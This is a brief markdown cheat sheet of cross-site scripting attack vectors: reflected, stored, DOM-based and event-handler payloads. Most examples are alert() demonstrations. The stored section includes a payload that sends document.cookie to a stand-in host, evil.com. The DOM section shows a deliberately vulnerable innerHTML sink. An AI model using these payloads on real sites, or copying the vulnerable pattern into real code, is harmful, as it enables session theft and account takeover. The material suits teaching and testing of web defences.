# XSS Attack Vectors

## Reflected XSS

```html
<!-- URL: /search?q=<script>alert('XSS')</script> -->
<div>Results: <script>alert('XSS')</script></div>
```

## Stored XSS

```javascript
// Attacker posts comment
POST /api/comments
{
  "text": "<script>fetch('//evil.com?c='+document.cookie)</script>"
}

// Stored in database, executed for all viewers
```

## DOM-based XSS

```javascript
// Vulnerable JavaScript
document.getElementById('welcome').innerHTML = 
    "Hello " + location.hash.substring(1);

// Attack URL: site.com#<img src=x onerror=alert('XSS')>
```

## Event Handler XSS

```html
<img src="x" onerror="alert('XSS')">
<body onload="alert('XSS')">
<svg onload="alert('XSS')">
```
